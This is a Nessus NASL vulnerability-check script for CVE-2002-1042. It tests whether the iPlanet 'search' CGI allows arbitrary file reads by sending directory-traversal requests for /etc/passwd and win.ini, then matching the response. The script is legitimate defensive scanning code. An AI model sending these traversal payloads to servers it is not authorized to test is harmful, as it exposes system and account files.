#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11043);
 script_bugtraq_id(5191);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2002-1042");
 
 name["english"] = "iPlanet Search Engine File Viewing";
 script_name(english:name["english"]);
 
 desc["english"] = "
An attacker may be able to read arbitrary files on the remote web 
server, using the 'search' CGI that comes with iPlanet. 

Risk factor : High
Solution : Turn off the search engine until a patch is released";


 script_description(english:desc["english"]);
 
 summary["english"] = "Attempts to read an arbitrary file using a feature in iPlanet"; 
 
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "Web Servers";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

function check(item, exp)
{
 req = http_get(item:item, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 r = tolower(r);
 if(egrep(string:r, pattern:exp, icase:1)){
	security_hole(port);
	exit(0);
	}
 return(0);
}



port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

check(item:"/search?NS-query-pat=..\..\..\..\..\..\..\..\winnt\win.ini", exp:"\[fonts\]");
check(item:"/search?NS-query-pat=../../../../../../../../../etc/passwd", exp:"root:.*:0:[01]:.*");


